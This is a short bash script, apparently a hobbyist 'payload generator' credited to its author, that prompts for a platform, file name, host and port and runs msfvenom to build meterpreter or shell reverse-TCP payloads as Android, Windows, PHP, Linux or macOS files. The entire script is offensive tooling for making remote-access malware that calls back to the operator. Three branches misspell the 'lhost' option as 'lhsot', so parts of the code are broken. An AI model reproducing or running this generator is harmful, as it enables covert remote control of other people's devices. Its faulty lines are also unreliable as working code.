apt install pv
clear
echo " 
█▀█ ▄▀█ █▄█ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ █▀█
█▀▀ █▀█ ░█░ █▄▄ █▀▄ █▀█ █▄▄ █░█ █▄█ " | pv -qL 90
echo 
echo "[1] android" 
echo 
echo "[2] windows" 
echo 
echo "[3] php"
echo 
echo "[4] linux" 
echo
echo "[5] mac"  
echo 
read -p "Choose from options >> " choose 
echo 
read -p "Type the name of your payload >> " name
echo  
read -p "Type your local host >> " ip
echo 
read -p "Type your local port >> " port 
echo 
echo "Waiting................." | pv -qL 5
if [ $choose -eq 1 ]
then 
	msfvenom -p android/meterpreter/reverse_tcp lhsot=$ip lport=$port > $name.apk
	clear
	echo "Your android payload has been created ! "
fi


 
if [ $choose -eq 2 ]
then 
        msfvenom -p windows/meterpreter/reverse_tcp lhsot=$ip lport=$port > $name.exe
        clear
        echo "Your windows payload has been created ! "
fi


if [ $choose -eq 3 ]
then 
        msfvenom -p php/meterpreter/reverse_tcp lhsot=$ip lport=$port > $name.php
        clear
        echo "Your php payload has been created ! "
fi
if [ $choose -eq 4 ]
then 
	msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$ip  lport=$port > $name.elf
	clear
	echo "Your linux payload has been created ! "
fi 


if [ $choose -eq 5 ]
then 
	msfvenom -p osx/x86/shell_reverse_tcp lhost=$ip  lport=$port > $name.macho
	clear
	echo "Your mac payload has been created ! "
fi



echo "===============================" | pv -qL 30
echo 
echo "Created by Yousef El-Halafawy" | pv -qL 15
echo
echo "===============================" | pv -qL 30
